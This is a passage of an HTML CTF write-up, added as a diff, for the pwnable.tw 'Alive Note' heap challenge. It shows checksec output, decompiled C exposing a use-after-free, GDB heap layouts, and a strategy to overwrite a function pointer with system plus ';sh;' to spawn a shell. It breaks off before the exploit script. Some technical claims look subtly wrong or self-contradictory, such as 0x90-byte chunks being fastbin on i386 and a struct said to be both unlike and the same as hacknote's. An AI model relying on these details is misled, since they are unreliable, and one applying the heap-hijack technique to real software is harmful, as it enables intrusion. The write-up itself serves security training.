@@ -1,0 +1,1372 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Alive Note | QA210 Pwnable.tw</title>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F4DD;</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<style>
+:root {
+  --bg: #0a0e17;
+  --bg2: #111827;
+  --card: #151d2e;
+  --border: #1e293b;
+  --fg: #e2e8f0;
+  --muted: #94a3b8;
+  --accent: #38bdf8;
+  --accent2: #818cf8;
+  --red: #f87171;
+  --green: #4ade80;
+  --yellow: #fbbf24;
+  --orange: #fb923c;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--fg);
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+
+/* Particle Canvas */
+#particles-canvas {
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  z-index: 0;
+  pointer-events: none;
+}
+
+/* Navigation */
+.nav {
+  position: fixed; top: 0; left: 0; right: 0;
+  z-index: 100;
+  background: rgba(10, 14, 23, 0.85);
+  backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  height: 60px;
+  display: flex;
+  align-items: center;
+  padding: 0 2rem;
+}
+.nav-brand {
+  font-weight: 800;
+  font-size: 1.25rem;
+  color: var(--accent);
+  letter-spacing: -0.5px;
+  text-decoration: none;
+}
+.nav-brand span { color: var(--accent2); }
+.nav-links {
+  display: flex;
+  gap: 0.25rem;
+  margin-left: 2rem;
+  list-style: none;
+}
+.nav-links a {
+  padding: 0.4rem 1rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.875rem;
+  font-weight: 500;
+  transition: all 0.2s;
+}
+.nav-links a:hover { color: var(--fg); background: rgba(255,255,255,0.05); }
+.nav-links a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+}
+.nav-right {
+  margin-left: auto;
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+}
+.nav-right a {
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: color 0.2s;
+}
+.nav-right a:hover { color: var(--fg); }
+
+/* Breadcrumb */
+.breadcrumb {
+  position: relative;
+  z-index: 1;
+  padding: 80px 2rem 0;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.breadcrumb-inner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.8125rem;
+  color: var(--muted);
+}
+.breadcrumb-inner a {
+  color: var(--muted);
+  text-decoration: none;
+  transition: color 0.2s;
+}
+.breadcrumb-inner a:hover { color: var(--accent); }
+.breadcrumb-sep { opacity: 0.4; }
+.breadcrumb-current { color: var(--fg); font-weight: 600; }
+
+/* Hero Section */
+.hero {
+  position: relative;
+  z-index: 1;
+  padding: 2rem 2rem 1rem;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+.hero-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.35rem 1rem;
+  background: rgba(56, 189, 248, 0.1);
+  border: 1px solid rgba(56, 189, 248, 0.2);
+  border-radius: 999px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  color: var(--accent);
+  margin-bottom: 1rem;
+}
+.hero-badge .dot {
+  width: 6px; height: 6px;
+  border-radius: 50%;
+  background: var(--green);
+  animation: pulse-dot 2s ease-in-out infinite;
+}
+@keyframes pulse-dot {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0.3; }
+}
+.hero h1 {
+  font-size: 2.75rem;
+  font-weight: 800;
+  letter-spacing: -1.5px;
+  margin-bottom: 0.5rem;
+  background: linear-gradient(135deg, var(--fg), var(--accent));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+}
+.hero-subtitle {
+  font-size: 1.1rem;
+  color: var(--muted);
+  max-width: 600px;
+  margin-bottom: 1.5rem;
+}
+.hero-meta {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  margin-bottom: 1rem;
+}
+.hero-tag {
+  padding: 0.3rem 0.75rem;
+  border-radius: 6px;
+  font-size: 0.75rem;
+  font-weight: 600;
+  font-family: 'JetBrains Mono', monospace;
+}
+.tag-pts { background: rgba(251, 191, 36, 0.15); color: var(--yellow); border: 1px solid rgba(251, 191, 36, 0.25); }
+.tag-arch { background: rgba(129, 140, 248, 0.15); color: var(--accent2); border: 1px solid rgba(129, 140, 248, 0.25); }
+.tag-vuln { background: rgba(248, 113, 113, 0.15); color: var(--red); border: 1px solid rgba(248, 113, 113, 0.25); }
+.tag-nx { background: rgba(74, 222, 128, 0.15); color: var(--green); border: 1px solid rgba(74, 222, 128, 0.25); }
+
+/* Main Layout */
+.main-layout {
+  position: relative;
+  z-index: 1;
+  display: flex;
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 1rem 2rem 4rem;
+  gap: 2rem;
+}
+
+/* TOC Sidebar */
+.toc-sidebar {
+  position: sticky;
+  top: 80px;
+  width: 240px;
+  flex-shrink: 0;
+  height: fit-content;
+  max-height: calc(100vh - 100px);
+  overflow-y: auto;
+}
+.toc-sidebar::-webkit-scrollbar { width: 3px; }
+.toc-sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+.toc-title {
+  font-size: 0.6875rem;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--muted);
+  margin-bottom: 1rem;
+}
+.toc-list { list-style: none; }
+.toc-list li { margin-bottom: 0.25rem; }
+.toc-list a {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.4rem 0.75rem;
+  border-radius: 6px;
+  color: var(--muted);
+  text-decoration: none;
+  font-size: 0.8125rem;
+  font-weight: 500;
+  transition: all 0.2s;
+  border-left: 2px solid transparent;
+}
+.toc-list a:hover { color: var(--fg); background: rgba(255,255,255,0.03); }
+.toc-list a.active {
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.08);
+  border-left-color: var(--accent);
+}
+.toc-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.6875rem;
+  font-weight: 700;
+  color: var(--accent2);
+  min-width: 18px;
+}
+
+/* Content Area */
+.content-area {
+  flex: 1;
+  min-width: 0;
+  max-width: 880px;
+}
+
+/* Chapter Sections */
+.chapter {
+  margin-bottom: 3rem;
+  scroll-margin-top: 80px;
+}
+.chapter-header {
+  display: flex;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.5rem;
+  padding-bottom: 1rem;
+  border-bottom: 1px solid var(--border);
+}
+.chapter-num {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.75rem;
+  font-weight: 700;
+  color: var(--accent);
+  background: rgba(56, 189, 248, 0.1);
+  padding: 0.35rem 0.7rem;
+  border-radius: 6px;
+  border: 1px solid rgba(56, 189, 248, 0.2);
+}
+.chapter-title {
+  font-size: 1.5rem;
+  font-weight: 700;
+  letter-spacing: -0.5px;
+}
+
+.chapter p {
+  margin-bottom: 1rem;
+  color: var(--muted);
+  font-size: 0.9375rem;
+  line-height: 1.8;
+}
+
+.chapter h3 {
+  font-size: 1.1rem;
+  font-weight: 700;
+  margin: 1.75rem 0 0.75rem;
+  color: var(--fg);
+}
+.chapter h4 {
+  font-size: 0.9375rem;
+  font-weight: 600;
+  margin: 1.25rem 0 0.5rem;
+  color: var(--fg);
+}
+
+/* Code Blocks */
+.code-block {
+  position: relative;
+  margin: 1rem 0 1.5rem;
+  border-radius: 10px;
+  border: 1px solid var(--border);
+  background: var(--bg2);
+  overflow: hidden;
+}
+.code-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0.5rem 1rem;
+  background: rgba(0,0,0,0.3);
+  border-bottom: 1px solid var(--border);
+  font-size: 0.75rem;
+}
+.code-lang {
+  font-family: 'JetBrains Mono', monospace;
+  font-weight: 600;
+  color: var(--accent);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+.code-dots {
+  display: flex;
+  gap: 5px;
+}
+.code-dots span {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+.code-dots .d1 { background: #f87171; }
+.code-dots .d2 { background: #fbbf24; }
+.code-dots .d3 { background: #4ade80; }
+
+pre[class*="language-"] {
+  margin: 0 !important;
+  padding: 1rem 1.25rem !important;
+  background: transparent !important;
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+  line-height: 1.7 !important;
+  overflow-x: auto;
+}
+code[class*="language-"] {
+  font-family: 'JetBrains Mono', monospace !important;
+  font-size: 0.8125rem !important;
+}
+
+/* Inline Code */
+code.inline {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8125rem;
+  background: rgba(129, 140, 248, 0.12);
+  color: var(--accent2);
+  padding: 0.15rem 0.45rem;
+  border-radius: 4px;
+  font-weight: 500;
+}
+
+/* Callout Boxes */
+.callout {
+  border-radius: 10px;
+  padding: 1rem 1.25rem;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.875rem;
+  line-height: 1.7;
+  border: 1px solid;
+}
+.callout-title {
+  font-weight: 700;
+  font-size: 0.8125rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  margin-bottom: 0.35rem;
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+.callout-vuln {
+  background: rgba(248, 113, 113, 0.08);
+  border-color: rgba(248, 113, 113, 0.2);
+  color: #fca5a5;
+}
+.callout-vuln .callout-title { color: var(--red); }
+.callout-info {
+  background: rgba(56, 189, 248, 0.08);
+  border-color: rgba(56, 189, 248, 0.2);
+  color: #bae6fd;
+}
+.callout-info .callout-title { color: var(--accent); }
+.callout-warn {
+  background: rgba(251, 191, 36, 0.08);
+  border-color: rgba(251, 191, 36, 0.2);
+  color: #fde68a;
+}
+.callout-warn .callout-title { color: var(--yellow); }
+.callout-key {
+  background: rgba(129, 140, 248, 0.08);
+  border-color: rgba(129, 140, 248, 0.2);
+  color: #c7d2fe;
+}
+.callout-key .callout-title { color: var(--accent2); }
+.callout-success {
+  background: rgba(74, 222, 128, 0.08);
+  border-color: rgba(74, 222, 128, 0.2);
+  color: #bbf7d0;
+}
+.callout-success .callout-title { color: var(--green); }
+
+/* Tables */
+.info-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1rem 0 1.5rem;
+  font-size: 0.8125rem;
+}
+.info-table th {
+  text-align: left;
+  padding: 0.6rem 1rem;
+  background: rgba(0,0,0,0.3);
+  color: var(--muted);
+  font-weight: 600;
+  font-size: 0.75rem;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  border-bottom: 1px solid var(--border);
+}
+.info-table td {
+  padding: 0.6rem 1rem;
+  border-bottom: 1px solid var(--border);
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+}
+.info-table tr:last-child td { border-bottom: none; }
+.info-table .label { color: var(--muted); font-family: 'Inter', sans-serif; }
+.info-table .value { color: var(--fg); }
+.info-table .on { color: var(--green); }
+.info-table .off { color: var(--red); }
+.info-table .partial { color: var(--yellow); }
+
+/* Memory Diagrams */
+.mem-diagram {
+  background: var(--bg2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin: 1rem 0 1.5rem;
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 0.8rem;
+  overflow-x: auto;
+}
+.mem-row {
+  display: flex;
+  align-items: center;
+  margin-bottom: 2px;
+}
+.mem-addr {
+  color: var(--accent);
+  min-width: 100px;
+  font-weight: 600;
+}
+.mem-arrow {
+  color: var(--muted);
+  margin: 0 0.5rem;
+}
+.mem-data {
+  color: var(--fg);
+  flex: 1;
+}
+.mem-desc {
+  color: var(--muted);
+  font-style: italic;
+  margin-left: 1rem;
+  font-size: 0.75rem;
+}
+.mem-highlight { color: var(--red); font-weight: 700; }
+.mem-green { color: var(--green); font-weight: 700; }
+.mem-yellow { color: var(--yellow); font-weight: 700; }
+
+/* Step Lists */
+.step-list {
+  list-style: none;
+  margin: 1rem 0 1.5rem;
+  counter-reset: step;
+}
+.step-list li {
+  counter-increment: step;
+  padding: 0.6rem 0 0.6rem 2.5rem;
+  position: relative;
+  font-size: 0.9rem;
+  color: var(--muted);
+  line-height: 1.7;
+}
+.step-list li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  top: 0.65rem;
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  background: rgba(129, 140, 248, 0.15);
+  color: var(--accent2);
+  font-size: 0.6875rem;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'JetBrains Mono', monospace;
+}
+.step-list li strong { color: var(--fg); }
+
+/* Footer */
+.footer {
+  position: relative;
+  z-index: 1;
+  text-align: center;
+  padding: 2rem;
+  border-top: 1px solid var(--border);
+  color: var(--muted);
+  font-size: 0.75rem;
+}
+.footer a { color: var(--accent); text-decoration: none; }
+.footer a:hover { text-decoration: underline; }
+
+/* Responsive */
+@media (max-width: 1024px) {
+  .toc-sidebar { display: none; }
+  .hero h1 { font-size: 2rem; }
+}
+@media (max-width: 640px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 1.5rem; }
+  .main-layout { padding: 1rem; }
+}
+
+/* ═══ FIXED NAV ADDITIONS ═══ */
+.site-header{position:sticky;top:0;z-index:1000;background:rgba(10,14,23,.92);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:0 32px;display:flex;align-items:center;justify-content:space-between;height:56px}
+.brand{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--fg);font-weight:700;font-size:1.1rem}
+.logo-icon{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;background:linear-gradient(135deg,var(--accent),var(--accent2));border-radius:6px;font-weight:900;font-size:.9rem;color:#0a0e17}
+.cursor{display:inline-block;width:2px;height:1em;background:var(--accent);margin-left:2px;animation:blink 1s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.nav-main{display:flex;align-items:center;gap:24px}
+.nav-main a{color:var(--muted);text-decoration:none;font-size:.85rem;transition:color .2s}
+.nav-main a:hover,.nav-main a.active{color:var(--fg)}
+.nav-main a.active{border-bottom:2px solid var(--accent)}
+.nav-right{display:flex;align-items:center;gap:16px}
+.social-link{color:var(--muted);font-size:1.1rem;transition:color .2s}
+.social-link:hover{color:var(--fg)}
+.mobile-toggle{display:none;background:none;border:none;color:var(--fg);font-size:1.4rem;cursor:pointer}
+.mobile-nav-overlay,.mobile-nav-panel{display:none}
+.mobile-nav-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:2000}
+.mobile-nav-overlay.show{display:block}
+.mobile-nav-panel{display:none;position:fixed;top:0;right:0;width:280px;height:100vh;background:var(--bg2);z-index:2001;padding:24px;transform:translateX(100%);transition:transform .3s}
+.mobile-nav-panel.show{display:block;transform:translateX(0)}
+.mobile-nav-panel nav{display:flex;flex-direction:column;gap:16px;margin-top:32px}
+.mobile-nav-panel nav a{color:var(--fg);text-decoration:none;font-size:1rem}
+.mnp-close{background:none;border:none;color:var(--fg);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:960px){
+.nav-main a:not(.active){display:none}
+.mobile-toggle{display:block}
+.site-header{padding:0 16px}
+}
+
+</style>
+</head>
+<body>
+
+<!-- Particle Canvas -->
+<canvas id="particles-canvas"></canvas>
+
+<!-- Navigation -->
+<header class="site-header">
+  <a href="/" class="brand"><span class="logo-icon">Q</span>QA210<span class="cursor"></span></a>
+  <nav class="nav-main">
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/" class="active">Pwnable.tw</a>
+    <a href="/tjctf-2026/">TJCTF</a><a href="/research/">Research</a>
+  </nav>
+  <div class="nav-right">
+    <a href="https://github.com/Yuri08-QA210" target="_blank" class="social-link" title="GitHub"><i class="bi bi-github"></i></a>
+    <button class="mobile-toggle" onclick="toggleMobileNav()" aria-label="Menu"><i class="bi bi-list"></i></button>
+  </div>
+</header>
+
+<div class="mobile-nav-overlay" id="mobileOverlay" onclick="toggleMobileNav()"></div>
+<div class="mobile-nav-panel" id="mobilePanel">
+  <button class="mnp-close" onclick="toggleMobileNav()"><i class="bi bi-x-lg"></i></button>
+  <nav>
+    <a href="/">Home</a><a href="/writeup/">writeup</a><a href="/htb/">Hack The Box</a><a href="/tryhackme/">TryHackMe</a>
+    <a href="/mal-dev/">Malware Dev</a><a href="/pwnable-tw/">Pwnable.tw</a><a href="/tjctf-2026/">TJCTF</a>
+    <a href="/research/">Research</a><a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a>
+  </nav>
+</div>
+
+<!-- Breadcrumb -->
+<div class="breadcrumb">
+  <div class="breadcrumb-inner">
+    <a href="/">Home</a>
+    <span class="breadcrumb-sep">/</span>
+    <a href="/pwnable-tw/">Pwnable.tw</a>
+    <span class="breadcrumb-sep">/</span>
+    <span class="breadcrumb-current">alive_note</span>
+  </div>
+</div>
+
+<!-- Hero Section -->
+<section class="hero">
+  <div class="hero-badge">
+    <span class="dot"></span>
+    Pwnable.tw
+  </div>
+  <h1>Alive Note</h1>
+  <p class="hero-subtitle">A note-taking application with a classic heap UAF &mdash; exploiting dangling pointers to leak libc via unsorted bin and hijack control flow through a function pointer overwrite.</p>
+  <div class="hero-meta">
+    <span class="hero-tag tag-pts">300 pts</span>
+    <span class="hero-tag tag-arch">i386 (32-bit ELF)</span>
+    <span class="hero-tag tag-vuln">Use-After-Free</span>
+    <span class="hero-tag tag-nx">NX Enabled</span>
+  </div>
+</section>
+
+<!-- Main Layout -->
+<div class="main-layout">
+
+  <!-- TOC Sidebar -->
+  <aside class="toc-sidebar">
+    <div class="toc-title">Table of Contents</div>
+    <ul class="toc-list" id="toc-list">
+      <li><a href="#ch1" class="active"><span class="toc-num">01</span> Reconnaissance</a></li>
+      <li><a href="#ch2"><span class="toc-num">02</span> Static Analysis</a></li>
+      <li><a href="#ch3"><span class="toc-num">03</span> GDB Debugging</a></li>
+      <li><a href="#ch4"><span class="toc-num">04</span> Exploit Strategy</a></li>
+      <li><a href="#ch5"><span class="toc-num">05</span> Pwn Script</a></li>
+      <li><a href="#ch6"><span class="toc-num">06</span> Execution Results</a></li>
+    </ul>
+  </aside>
+
+  <!-- Content Area -->
+  <main class="content-area">
+
+    <!-- Chapter 1: Reconnaissance -->
+    <section class="chapter" id="ch1">
+      <div class="chapter-header">
+        <span class="chapter-num">01</span>
+        <h2 class="chapter-title">Reconnaissance</h2>
+      </div>
+
+      <h3>Challenge Info</h3>
+      <table class="info-table">
+        <tr><td class="label">Connection</td><td class="value"><code class="inline">nc chall.pwnable.tw 10300</code></td></tr>
+        <tr><td class="label">Binary</td><td class="value">alive_note (32-bit ELF, i386)</td></tr>
+        <tr><td class="label">Points</td><td class="value">300</td></tr>
+        <tr><td class="label">Description</td><td class="value">A note-taking application with heap operations</td></tr>
+      </table>
+
+      <h3>checksec</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">bash</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ checksec alive_note
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)</code></pre>
+      </div>
+
+      <table class="info-table">
+        <tr><td class="label">Partial RELRO</td><td class="partial">GOT is writable &mdash; we can overwrite GOT entries if needed</td></tr>
+        <tr><td class="label">Canary found</td><td class="on">Stack buffer overflows are mitigated</td></tr>
+        <tr><td class="label">NX enabled</td><td class="on">No shellcode on stack/heap &mdash; must use ROP or function pointers</td></tr>
+        <tr><td class="label">No PIE</td><td class="off">Binary addresses are fixed &mdash; known GOT/PLT addresses</td></tr>
+      </table>
+
+      <h3>Running the Binary</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ ./alive_note
+----------------------
+      Alive Note
+----------------------
+ 1. Add note
+ 2. Delete note
+ 3. Print note
+ 4. Exit
+----------------------
+Your choice :1
+Note size :32
+Content :AAAA
+Success !
+----------------------
+      Alive Note
+----------------------
+ 1. Add note
+ 2. Delete note
+ 3. Print note
+ 4. Exit
+----------------------
+Your choice :3
+Index :0
+AAAA</code></pre>
+      </div>
+
+      <p>The binary presents a note manager with add, delete, and print operations. It appears similar to hacknote, but the internal structure and size constraints differ significantly. The menu is simple, but the implementation hides a critical UAF vulnerability.</p>
+    </section>
+
+    <!-- Chapter 2: Static Analysis -->
+    <section class="chapter" id="ch2">
+      <div class="chapter-header">
+        <span class="chapter-num">02</span>
+        <h2 class="chapter-title">Static Analysis</h2>
+      </div>
+
+      <h3>Note Structure</h3>
+      <p>Each note is represented by a struct allocated on the heap. Unlike hacknote which uses an 8-byte struct, Alive Note uses the same layout but with different operational constraints:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">typedef struct note {
+    void (*print_func)(struct note *);  // +0x00: function pointer (4 bytes)
+    char *contents;                      // +0x04: pointer to content buffer (4 bytes)
+} note;  // Total: 8 bytes</code></pre>
+      </div>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Key Insight</div>
+        The struct stores a <strong>function pointer</strong> at offset 0 and a <strong>content pointer</strong> at offset 4. The <code class="inline">print_func</code> is set to the default print handler at <code class="inline">0x0804865b</code>, which calls <code class="inline">puts(note-&gt;contents)</code>. If we can overwrite <code class="inline">print_func</code>, we control execution flow &mdash; same primitive as hacknote, but with a twist.
+      </div>
+
+      <h3>add_note()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void add_note() {
+    if (counter &lt;= 8) {         // Up to 8 notes (indices 0-7)
+        i = 0;
+        while (i &lt; 8) {
+            if (notes_list[i] == NULL) {
+                note = malloc(8);                    // Allocate 8-byte struct
+                notes_list[i] = note;
+                notes_list[i]-&gt;print_func = 0x0804865b;  // Set default print function
+                printf("Note size :");
+                read(0, note_size, 8);
+                size = atoi(note_size);
+                contents = malloc(size);             // Allocate content buffer
+                notes_list[i]-&gt;contents = contents;
+                printf("Content :");
+                read(0, notes_list[i]-&gt;contents, size);
+                puts("Success !");
+                counter++;
+                break;
+            }
+            i++;
+        }
+    }
+}</code></pre>
+      </div>
+
+      <p>The <code class="inline">add_note</code> function allocates two heap objects per note: an 8-byte struct and a user-sized content buffer. Up to 8 notes can be created (index 0&ndash;7), more than hacknote's 5. Crucially, <strong>there is no upper bound check on the size</strong>, allowing us to allocate large chunks that bypass fastbin and land in unsorted bin when freed.</p>
+
+      <h3>delete_note()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void delete_note() {
+    printf("Index :");
+    read(0, index_str, 4);
+    index = atoi(index_str);
+    if (index &gt;= 0 &amp;&amp; index &lt; 8) {
+        if (notes_list[index] != NULL) {
+            free(notes_list[index]-&gt;contents);    // Free content buffer
+            free(notes_list[index]);               // Free note struct
+            // BUG: notes_list[index] is NOT set to NULL!
+            counter--;
+            puts("Success");
+        }
+    }
+}</code></pre>
+      </div>
+
+      <div class="callout callout-vuln">
+        <div class="callout-title">&#x1f6a8; Vulnerability: Use-After-Free (UAF)</div>
+        After freeing both the content buffer and the note struct, <code class="inline">delete_note</code> does <strong>NOT</strong> set <code class="inline">notes_list[index]</code> to <code class="inline">NULL</code>. This creates a dangling pointer:<br>
+        &bull; The pointer remains in <code class="inline">notes_list</code> pointing to freed memory<br>
+        &bull; <code class="inline">print_note</code> will still dereference the dangling pointer<br>
+        &bull; We can allocate new memory that reuses the freed chunk, overwriting the old struct's fields<br>
+        &bull; Since <code class="inline">counter</code> is decremented but the slot is not cleared, we can also <strong>double-free</strong> the same index
+      </div>
+
+      <h3>print_note()</h3>
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">c</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-c">void print_note() {
+    printf("Index :");
+    read(0, index_str, 4);
+    index = atoi(index_str);
+    if (index &gt;= 0 &amp;&amp; index &lt; 8) {
+        if (notes_list[index] != NULL) {
+            // Calls through the function pointer!
+            (*notes_list[index]-&gt;print_func)(notes_list[index]);
+        }
+    }
+}
+
+// The default print function at 0x0804865b:
+void print_func(char **param_1) {
+    puts(param_1[1]);   // prints note-&gt;contents
+}</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Critical Detail</div>
+        <code class="inline">print_note</code> calls <code class="inline">note-&gt;print_func(note)</code> &mdash; the <strong>note pointer itself</strong> is passed as the first argument. This means:<br>
+        &bull; If we overwrite <code class="inline">print_func</code> with <code class="inline">system</code>, it will call <code class="inline">system(note_ptr)</code><br>
+        &bull; The first bytes of the note struct (where <code class="inline">print_func</code> was) become the "command string"<br>
+        &bull; We can embed <code class="inline">;sh;</code> after the function pointer bytes to execute a shell<br>
+        &bull; Alternatively, we can point <code class="inline">contents</code> to a GOT entry to leak libc addresses
+      </div>
+
+      <h3>Difference from Hacknote</h3>
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Alive Note vs Hacknote</div>
+        While structurally similar, Alive Note has important differences:<br>
+        &bull; <strong>8 note slots</strong> instead of 5 &mdash; more room for heap manipulation<br>
+        &bull; <strong>No upper size limit</strong> &mdash; we can allocate chunks larger than fastbin range (&gt;0x80), enabling <strong>unsorted bin attacks</strong><br>
+        &bull; The <strong>index check uses <code class="inline">index &gt;= 0 &amp;&amp; index &lt; 8</code></strong> instead of just checking NULL &mdash; bounds are verified but the pointer is still not nulled after free<br>
+        &bull; The default print function is at a <strong>different address</strong> (<code class="inline">0x0804865b</code>)
+      </div>
+    </section>
+
+    <!-- Chapter 3: GDB Debugging -->
+    <section class="chapter" id="ch3">
+      <div class="chapter-header">
+        <span class="chapter-num">03</span>
+        <h2 class="chapter-title">GDB Debugging</h2>
+      </div>
+
+      <h3>Heap Layout After Adding Notes</h3>
+      <p>Let's create notes with different sizes to understand the heap layout. Small notes (size &le; 0x80) go into fastbin when freed, while larger notes go into unsorted bin:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # add_note(0x80, "A"*0x10) -> note 0 (small, fits in fastbin)
+gdb-peda$ # add_note(0x100, "B"*0x10) -> note 1 (large, goes to unsorted bin)
+gdb-peda$ # add_note(0x80, "C"*0x10) -> note 2 (small, fastbin)
+gdb-peda$ heap chunks
+0x0804a000: fastbin 0x10 bytes  [note 0 struct]
+0x0804a010: fastbin 0x90 bytes  [note 0 contents (0x80+header)]
+0x0804a0a0: fastbin 0x10 bytes  [note 1 struct]
+0x0804a0b0: normal  0x110 bytes [note 1 contents (0x100+header)]
+0x0804a1c0: fastbin 0x10 bytes  [note 2 struct]
+0x0804a1d0: fastbin 0x90 bytes  [note 2 contents (0x80+header)]</code></pre>
+      </div>
+
+      <div class="mem-diagram">
+        <div class="mem-row"><span class="mem-addr">0x0804a000</span><span class="mem-arrow">|</span><span class="mem-data">0x0804865b</span><span class="mem-desc">&larr; note0-&gt;print_func (default)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a004</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a018</span><span class="mem-desc">&larr; note0-&gt;contents pointer</span></div>
+        <div style="height:8px"></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a0a0</span><span class="mem-arrow">|</span><span class="mem-data">0x0804865b</span><span class="mem-desc">&larr; note1-&gt;print_func (default)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a0a4</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a0b8</span><span class="mem-desc">&larr; note1-&gt;contents pointer (large chunk!)</span></div>
+        <div style="height:8px"></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a1c0</span><span class="mem-arrow">|</span><span class="mem-data">0x0804865b</span><span class="mem-desc">&larr; note2-&gt;print_func (default)</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a1c4</span><span class="mem-arrow">|</span><span class="mem-data">0x0804a1d8</span><span class="mem-desc">&larr; note2-&gt;contents pointer</span></div>
+      </div>
+
+      <h3>Unsorted Bin Leak</h3>
